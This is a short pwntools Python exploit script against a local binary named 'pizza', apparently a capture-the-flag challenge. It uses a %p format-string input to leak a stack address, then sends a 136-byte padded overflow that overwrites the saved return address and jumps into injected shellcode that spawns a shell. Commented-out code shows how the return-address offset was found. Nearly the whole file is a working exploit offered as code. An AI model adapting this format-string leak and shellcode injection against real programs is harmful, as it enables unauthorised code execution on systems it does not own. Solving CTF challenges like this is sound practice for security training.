#!/usr/bin/env python3

from pwn import *

elf = ELF("./pizza")
io = elf.process()

# gdb.attach(io, '''
# set follow-fork-mode child
# break 1
# continue
# ''')

context(arch='amd64', os='linux', endian='little', word_size=64)

# leak
print(str(io.recvline(), "latin-1"))
io.sendline(b"%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p")

temp = io.recvline()
print(str(temp))
leak = temp[3:-1].split(b",")[6]
print(leak)

print(str(io.recvline(), "latin-1"))

io.sendline(b"1")
print(str(io.recvline(), "latin-1"))

# overflow
start_buf = (int(leak, 16))

info("leaked start of buffer: 0x{:08x}".format(start_buf))

padding = b"a" * 136

RIP = struct.pack("Q", start_buf + 32)
shellcode = asm(shellcraft.amd64.linux.sh())


payload = bytearray(padding)

info("RIP {}".format(RIP))
payload.extend(RIP)
payload.extend(shellcode)
info("payload: {}".format(payload))

io.sendline(payload)
print(str(io.recvline(), "latin-1"))

io.interactive()


# finding rip offset
# io.sendline(cyclic(500))
# 
# io.wait()
# core = io.corefile
# stack = core.rsp
# info("rsp = %#x", stack)
# pattern = core.read(stack, 4)
# rip_offset = cyclic_find(pattern)
# 
# info("rip offset is %d", rip_offset)
# rip offset is 136



